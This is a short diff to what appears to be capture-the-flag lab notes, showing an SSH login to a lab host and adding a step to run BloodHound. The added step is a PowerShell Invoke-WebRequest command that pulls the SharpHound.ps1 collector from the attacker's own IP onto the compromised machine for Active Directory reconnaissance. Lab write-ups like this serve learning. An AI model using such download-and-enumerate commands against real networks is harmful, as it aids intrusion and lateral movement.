@@ -34,4 +34,7 @@ ssh tom@10.10.10.77
 
 ![[Pasted image 20240510130253.png]]
 
-This means we have to run Bloodhound.
+This means we have to run Bloodhound for that we have to use SharpHound.ps1
+```
+IWR -Uri http://10.10.16.20/SharpHound.ps1 -OutFile SharpHound.ps1
+```
